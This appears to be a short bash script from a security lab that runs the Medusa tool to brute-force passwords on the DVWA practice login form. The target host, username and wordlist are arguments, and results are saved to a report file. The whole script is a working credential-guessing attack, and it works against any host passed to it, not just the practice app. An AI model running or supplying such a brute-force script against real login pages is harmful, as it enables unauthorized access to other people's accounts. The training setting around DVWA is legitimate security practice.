#!/bin/bash
TARGET=$1
USER=$2
WORDLIST=${3:-../wordlists/small-words.txt}
medusa -h "$TARGET" -u "$USER" -P "$WORDLIST" -M http_form -m "path:/dvwa/login.php,postfields:username=^USER^&password=^PASS^,success:Welcome" -t 6 | tee ../reports/medusa-web-$(echo $TARGET).txt
